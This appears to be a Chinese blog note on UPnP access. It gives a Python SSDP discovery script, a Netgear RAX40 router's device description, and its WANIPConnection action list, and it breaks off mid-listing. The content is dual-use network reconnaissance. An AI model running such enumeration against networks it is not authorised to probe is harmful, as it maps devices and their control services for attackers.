<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/article/0.html"/>
    <url>/article/0.html</url>
    
    <content type="html"><![CDATA[<hr><hr><p><strong>upnp访问过程</strong></p><p>#随笔</p><p>udp访问239.255.255.250的1900端口，ssdp协议</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> reANY = <span class="hljs-string">&quot;0.0.0.0&quot;</span>DES_IP = <span class="hljs-string">&quot;239.255.255.250&quot;</span>PORT = <span class="hljs-number">1900</span>xml_str = <span class="hljs-string">b&#x27;M-SEARCH * HTTP/1.1\r\n&#x27;</span> \    \+ <span class="hljs-string">b&#x27;HOST: 239.255.255.250:1900\r\n&#x27;</span> \    \+ <span class="hljs-string">b&#x27;MAN: &quot;ssdp:discover&quot;\r\n&#x27;</span> \    \+ <span class="hljs-string">b&#x27;MX: 1\r\n&#x27;</span> \    \+ <span class="hljs-string">b&#x27;ST: urn:dial-multiscreen-org:service:dial:1\r\n&#x27;</span> \    \+ <span class="hljs-string">b&#x27;USER-AGENT: Google Chrome/87.0.4280.88 Windows\r\n\r\n\r\n&#x27;</span>s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,<span class="hljs-number">1</span>)s.bind((ANY,PORT))s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, <span class="hljs-number">255</span>)s.setsockopt(  socket.IPPROTO_IP,  socket.IP_ADD_MEMBERSHIP,  socket.inet_aton(DES_IP) + socket.inet_aton(ANY))s.setblocking(<span class="hljs-literal">False</span>)s.sendto(xml_str,(DES_IP,PORT))<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <span class="hljs-keyword">try</span>:    data, address = s.recvfrom(<span class="hljs-number">2048</span>)  <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:    <span class="hljs-keyword">pass</span>  <span class="hljs-keyword">else</span>:    <span class="hljs-built_in">print</span>(address)    <span class="hljs-built_in">print</span>(data)</code></pre></div><p>通过这种方式可以获取到同网下的其他upnp设备信息</p><div class="code-wrapper"><pre><code class="hljs bash">(<span class="hljs-string">&#x27;10.0.0.1&#x27;</span>, 35150)b<span class="hljs-string">&#x27;NOTIFY * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nCACHE-CONTROL: max-age=3600\r\nLOCATION: http://10.0.0.1:56688/rootDesc.xml\r\nSERVER: OpenWRT/OpenWrt UPnP/1.1 MiniUPnPd/2.0\r\nNT: upnp:rootdevice\r\nUSN: uuid:97fd7581-d522-415d-bfae-a51ac69e4b55::upnp:rootdevice\r\nNTS: ssdp:alive\r\nOPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=01\r\n01-NLS: 1693189369\r\nBOOTID.UPNP.ORG: 1693189369\r\nCONFIGID.UPNP.ORG: 1337\r\n\r\n&#x27;</span>(<span class="hljs-string">&#x27;10.0.0.1&#x27;</span>, 60956)b<span class="hljs-string">&#x27;NOTIFY * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nCACHE-CONTROL: max-age=1801\r\nNTS: ssdp:alive\r\nLOCATION: http://10.0.0.1:49153/wps_device.xml\r\nSERVER: Unspecified, UPnP/1.0, Unspecified\r\nNT: urn:schemas-wifialliance-org:service:WFAWLANConfig:1\r\nUSN: uuid:dd20a05f-a846-47cf-b976-047083022a1d::urn:schemas-wifialliance-org:service:WFAWLANConfig:1\r\n\r\n&#x27;</span></code></pre></div><p>现在是以10.0.0.1做演示</p><p>信息中能发现LOCATION</p><p><a href="http://10.0.0.1:49153/wps_device.xml"><em>http://10.0.0.1:49153/wps_device.xml</em></a></p><p><a href="http://10.0.0.1:56688/rootDesc.xml"><em>http://10.0.0.1:56688/rootDesc.xml</em></a></p><p>rootDesc.xml文件</p><p>This XML file does not appear to have any style information associated with it. The document tree is shown below.</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>  <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;urn:schemas-upnp-org:device-1-0&quot;</span>  <span class="hljs-attr">configId</span>=<span class="hljs-string">&quot;1337&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">specVersion</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">major</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">major</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">minor</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">minor</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">specVersion</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">device</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">deviceType</span>&gt;</span>urn:schemas-upnp-org:device:InternetGatewayDevice:1<span class="hljs-tag">&lt;/<span class="hljs-name">deviceType</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">friendlyName</span>&gt;</span>RAX40 (Gateway)<span class="hljs-tag">&lt;/<span class="hljs-name">friendlyName</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">manufacturer</span>&gt;</span>Netgear, Inc.<span class="hljs-tag">&lt;/<span class="hljs-name">manufacturer</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">manufacturerURL</span>&gt;</span>http://www.NETGEAR.com<span class="hljs-tag">&lt;/<span class="hljs-name">manufacturerURL</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">modelDescription</span>&gt;</span>OpenWRT router<span class="hljs-tag">&lt;/<span class="hljs-name">modelDescription</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">modelName</span>&gt;</span>RAX40<span class="hljs-tag">&lt;/<span class="hljs-name">modelName</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">modelNumber</span>&gt;</span>RAX40<span class="hljs-tag">&lt;/<span class="hljs-name">modelNumber</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">modelURL</span>&gt;</span>http://www.netgear.com/home<span class="hljs-tag">&lt;/<span class="hljs-name">modelURL</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">serialNumber</span>&gt;</span>5UP299WPA0C55<span class="hljs-tag">&lt;/<span class="hljs-name">serialNumber</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">UDN</span>&gt;</span>uuid:97fd7581-d522-415d-bfae-a51ac69e4b55<span class="hljs-tag">&lt;/<span class="hljs-name">UDN</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">serviceList</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">service</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">serviceType</span>&gt;</span>urn:schemas-upnp-org:service:Layer3Forwarding:1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceType</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">serviceId</span>&gt;</span>urn:upnp-org:serviceId:L3Forwarding1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceId</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">SCPDURL</span>&gt;</span>/L3F.xml<span class="hljs-tag">&lt;/<span class="hljs-name">SCPDURL</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">controlURL</span>&gt;</span>/ctl/L3F<span class="hljs-tag">&lt;/<span class="hljs-name">controlURL</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">eventSubURL</span>&gt;</span>/evt/L3F<span class="hljs-tag">&lt;/<span class="hljs-name">eventSubURL</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">service</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">serviceList</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">deviceList</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">device</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">deviceType</span>&gt;</span>urn:schemas-upnp-org:device:WANDevice:1<span class="hljs-tag">&lt;/<span class="hljs-name">deviceType</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">friendlyName</span>&gt;</span>WANDevice<span class="hljs-tag">&lt;/<span class="hljs-name">friendlyName</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">manufacturer</span>&gt;</span>MiniUPnP<span class="hljs-tag">&lt;/<span class="hljs-name">manufacturer</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">manufacturerURL</span>&gt;</span>http://miniupnp.free.fr/<span class="hljs-tag">&lt;/<span class="hljs-name">manufacturerURL</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">modelDescription</span>&gt;</span>WAN Device<span class="hljs-tag">&lt;/<span class="hljs-name">modelDescription</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">modelName</span>&gt;</span>WAN Device<span class="hljs-tag">&lt;/<span class="hljs-name">modelName</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">modelNumber</span>&gt;</span>20220318<span class="hljs-tag">&lt;/<span class="hljs-name">modelNumber</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">modelURL</span>&gt;</span>http://miniupnp.free.fr/<span class="hljs-tag">&lt;/<span class="hljs-name">modelURL</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">serialNumber</span>&gt;</span>5UP299WPA0C55<span class="hljs-tag">&lt;/<span class="hljs-name">serialNumber</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">UDN</span>&gt;</span>uuid:97fd7581-d522-415d-bfae-a51ac69e4b56<span class="hljs-tag">&lt;/<span class="hljs-name">UDN</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">UPC</span>&gt;</span>000000000000<span class="hljs-tag">&lt;/<span class="hljs-name">UPC</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">serviceList</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">service</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">serviceType</span>&gt;</span>urn:schemas-upnp-org:service:WANCommonInterfaceConfig:1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceType</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">serviceId</span>&gt;</span>urn:upnp-org:serviceId:WANCommonIFC1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceId</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">SCPDURL</span>&gt;</span>/WANCfg.xml<span class="hljs-tag">&lt;/<span class="hljs-name">SCPDURL</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">controlURL</span>&gt;</span>/ctl/CmnIfCfg<span class="hljs-tag">&lt;/<span class="hljs-name">controlURL</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">eventSubURL</span>&gt;</span>/evt/CmnIfCfg<span class="hljs-tag">&lt;/<span class="hljs-name">eventSubURL</span>&gt;</span>​          <span class="hljs-tag">&lt;/<span class="hljs-name">service</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">serviceList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">deviceList</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">device</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">deviceType</span>&gt;</span>urn:schemas-upnp-org:device:WANConnectionDevice:1<span class="hljs-tag">&lt;/<span class="hljs-name">deviceType</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">friendlyName</span>&gt;</span>WANConnectionDevice<span class="hljs-tag">&lt;/<span class="hljs-name">friendlyName</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">manufacturer</span>&gt;</span>MiniUPnP<span class="hljs-tag">&lt;/<span class="hljs-name">manufacturer</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">manufacturerURL</span>&gt;</span>http://miniupnp.free.fr/<span class="hljs-tag">&lt;/<span class="hljs-name">manufacturerURL</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">modelDescription</span>&gt;</span>MiniUPnP daemon<span class="hljs-tag">&lt;/<span class="hljs-name">modelDescription</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">modelName</span>&gt;</span>MiniUPnPd<span class="hljs-tag">&lt;/<span class="hljs-name">modelName</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">modelNumber</span>&gt;</span>20220318<span class="hljs-tag">&lt;/<span class="hljs-name">modelNumber</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">modelURL</span>&gt;</span>http://miniupnp.free.fr/<span class="hljs-tag">&lt;/<span class="hljs-name">modelURL</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">serialNumber</span>&gt;</span>5UP299WPA0C55<span class="hljs-tag">&lt;/<span class="hljs-name">serialNumber</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">UDN</span>&gt;</span>uuid:97fd7581-d522-415d-bfae-a51ac69e4b57<span class="hljs-tag">&lt;/<span class="hljs-name">UDN</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">UPC</span>&gt;</span>000000000000<span class="hljs-tag">&lt;/<span class="hljs-name">UPC</span>&gt;</span>​            <span class="hljs-tag">&lt;<span class="hljs-name">serviceList</span>&gt;</span>​              <span class="hljs-tag">&lt;<span class="hljs-name">service</span>&gt;</span>​                <span class="hljs-tag">&lt;<span class="hljs-name">serviceType</span>&gt;</span>urn:schemas-upnp-org:service:WANIPConnection:1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceType</span>&gt;</span>​                <span class="hljs-tag">&lt;<span class="hljs-name">serviceId</span>&gt;</span>urn:upnp-org:serviceId:WANIPConn1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceId</span>&gt;</span>​                <span class="hljs-tag">&lt;<span class="hljs-name">SCPDURL</span>&gt;</span>/WANIPCn.xml<span class="hljs-tag">&lt;/<span class="hljs-name">SCPDURL</span>&gt;</span>​                <span class="hljs-tag">&lt;<span class="hljs-name">controlURL</span>&gt;</span>/ctl/IPConn<span class="hljs-tag">&lt;/<span class="hljs-name">controlURL</span>&gt;</span>​                <span class="hljs-tag">&lt;<span class="hljs-name">eventSubURL</span>&gt;</span>/evt/IPConn<span class="hljs-tag">&lt;/<span class="hljs-name">eventSubURL</span>&gt;</span>​              <span class="hljs-tag">&lt;/<span class="hljs-name">service</span>&gt;</span>​            <span class="hljs-tag">&lt;/<span class="hljs-name">serviceList</span>&gt;</span>​          <span class="hljs-tag">&lt;/<span class="hljs-name">device</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">deviceList</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">device</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">deviceList</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">presentationURL</span>&gt;</span>http://www.routerlogin.net<span class="hljs-tag">&lt;/<span class="hljs-name">presentationURL</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">device</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></code></pre></div><p>其中可以获取设备名称制造商各种服务等信息</p><p>L3Forwarding1</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">service</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">serviceType</span>&gt;</span>urn:schemas-upnp-org:service:Layer3Forwarding:1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceType</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">serviceId</span>&gt;</span>urn:upnp-org:serviceId:L3Forwarding1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceId</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">SCPDURL</span>&gt;</span>/L3F.xml<span class="hljs-tag">&lt;/<span class="hljs-name">SCPDURL</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">controlURL</span>&gt;</span>/ctl/L3F<span class="hljs-tag">&lt;/<span class="hljs-name">controlURL</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">eventSubURL</span>&gt;</span>/evt/L3F<span class="hljs-tag">&lt;/<span class="hljs-name">eventSubURL</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">service</span>&gt;</span></code></pre></div><p>WANCommonIFC1</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">service</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">serviceType</span>&gt;</span>urn:schemas-upnp-org:service:WANCommonInterfaceConfig:1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceType</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">serviceId</span>&gt;</span>urn:upnp-org:serviceId:WANCommonIFC1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceId</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">SCPDURL</span>&gt;</span>/WANCfg.xml<span class="hljs-tag">&lt;/<span class="hljs-name">SCPDURL</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">controlURL</span>&gt;</span>/ctl/CmnIfCfg<span class="hljs-tag">&lt;/<span class="hljs-name">controlURL</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">eventSubURL</span>&gt;</span>/evt/CmnIfCfg<span class="hljs-tag">&lt;/<span class="hljs-name">eventSubURL</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">service</span>&gt;</span></code></pre></div><p>WANIPConn1</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">service</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">serviceType</span>&gt;</span>urn:schemas-upnp-org:service:WANIPConnection:1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceType</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">serviceId</span>&gt;</span>urn:upnp-org:serviceId:WANIPConn1<span class="hljs-tag">&lt;/<span class="hljs-name">serviceId</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">SCPDURL</span>&gt;</span>/WANIPCn.xml<span class="hljs-tag">&lt;/<span class="hljs-name">SCPDURL</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">controlURL</span>&gt;</span>/ctl/IPConn<span class="hljs-tag">&lt;/<span class="hljs-name">controlURL</span>&gt;</span>​<span class="hljs-tag">&lt;<span class="hljs-name">eventSubURL</span>&gt;</span>/evt/IPConn<span class="hljs-tag">&lt;/<span class="hljs-name">eventSubURL</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">service</span>&gt;</span></code></pre></div><p>通过访问SCPDURL可以获取服务的具体行为，以WANIPConn1为例</p><p>访问<a href="http://10.0.0.1:56688/WANIPCn.xml">http://10.0.0.1:56688/WANIPCn.xml</a></p><div class="code-wrapper"><pre><code class="hljs xml">This XML file does not appear to have any style information associated with it. The document tree isshown below.<span class="hljs-tag">&lt;<span class="hljs-name">scpd</span>  <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;urn:schemas-upnp-org:service-1-0&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">specVersion</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">major</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">major</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">minor</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">minor</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">specVersion</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">actionList</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>SetConnectionType<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">argumentList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewConnectionType<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>ConnectionType<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">argumentList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>GetConnectionTypeInfo<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">argumentList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewConnectionType<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>ConnectionType<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewPossibleConnectionTypes<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PossibleConnectionTypes<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">argumentList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>RequestConnection<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>ForceTermination<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>GetStatusInfo<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">argumentList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewConnectionStatus<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>ConnectionStatus<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewLastConnectionError<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>LastConnectionError<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewUptime<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>Uptime<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">argumentList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>GetNATRSIPStatus<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">argumentList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewRSIPAvailable<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>RSIPAvailable<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewNATEnabled<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>NATEnabled<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">argumentList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>GetGenericPortMappingEntry<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">argumentList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewPortMappingIndex<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>PortMappingNumberOfEntries<span class="hljs-tag">&lt;/<span class="hljs-name">relatedStateVariable</span>&gt;</span>​        <span class="hljs-tag">&lt;/<span class="hljs-name">argument</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NewRemoteHost<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">direction</span>&gt;</span>out<span class="hljs-tag">&lt;/<span class="hljs-name">direction</span>&gt;</span>​          <span class="hljs-tag">&lt;<span class="hljs-name">relatedStateVariable</span>&gt;</span>RemoteHost<span class="hljs-tag">&lt;/<span 